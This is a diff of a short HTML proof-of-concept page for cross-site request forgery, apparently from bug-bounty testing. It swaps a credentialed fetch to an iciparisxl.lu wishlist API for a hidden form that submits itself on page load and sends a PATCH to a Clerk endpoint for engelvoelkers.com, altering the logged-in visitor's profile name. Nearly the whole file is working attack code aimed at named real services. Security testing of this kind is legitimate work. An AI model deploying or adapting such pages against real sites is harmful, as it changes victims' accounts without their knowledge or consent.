@@ -1,32 +1,18 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>JSON CSRF Test</title>
-</head>
 <body>
 
-<h2>Click to test CSRF</h2>
+<form action="https://clerk.engelvoelkers.com/v1/me?__clerk_api_version=2025-11-10&_clerk_js_version=5.127.2&_method=PATCH"
+      method="POST"
+      enctype="application/x-www-form-urlencoded">
 
-<button onclick="csrf()">Submit Request</button>
+    <input type="hidden" name="first_name" value="CSRF-Test">
+    <input type="hidden" name="last_name" value="CSRF-Modified">
+
+</form>
 
 <script>
-function csrf() {
-    fetch(
-        "https://api.iciparisxl.lu/api/v2/icilu3/forms/share-wishlist-form/steps/share-wishlist/validation?lang=fr_LU&curr=EUR",
-        {
-            method: "POST",
-            credentials: "include",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                email: "testerr0092@gmail.com"
-            })
-        }
-    )
-    .then(response => console.log(response))
-    .catch(error => console.log(error));
-}
+document.forms[0].submit();
 </script>
 
 </body>
